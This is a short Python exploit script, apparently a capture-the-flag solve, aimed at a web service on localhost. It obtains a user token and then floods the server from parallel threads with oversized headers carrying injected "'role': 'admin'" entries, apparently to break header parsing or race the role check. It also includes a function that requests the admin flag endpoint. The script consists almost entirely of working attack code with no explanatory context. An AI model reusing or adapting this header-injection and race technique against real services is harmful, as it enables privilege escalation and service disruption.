import requests
from threading import Thread
from time import sleep

resp = requests.get("http://localhost:8000/token")
print(resp.text)
user_token = resp.text

def request_flag():
    headers = {'Authorization': "Bearer "+user_token}
    resp = requests.get("http://localhost:8000/admin/flag", headers=headers)
    if "404" not in resp.text:
        print(resp.text)

def header_breaker():
    headers = {"A,":400*"B,", "B":400*"B,","C":400*"B,","D":400*"B,","E":400*"B,","F":400*"B,","AAAA,'role'": "'admin'", "BBBB,'role'": "'admin'", "CCCC,'role'": "'admin'","'role'": "'admin'"}
    resp = requests.get("http://localhost:8000/", headers=headers)

def loop_flag():
    while True:
        try:
            request_flag()
            #sleep(0.001)
        except Exception:
            pass

def loop_header():
    while True:
        try:
            header_breaker()
        except Exception:
            pass

header_breaker()
#exit(0)

t2 = Thread(target=loop_header)
t2.start()
t3 = Thread(target=loop_header)
t3.start()

input("Waiting for input and then quitting!")

exit(0)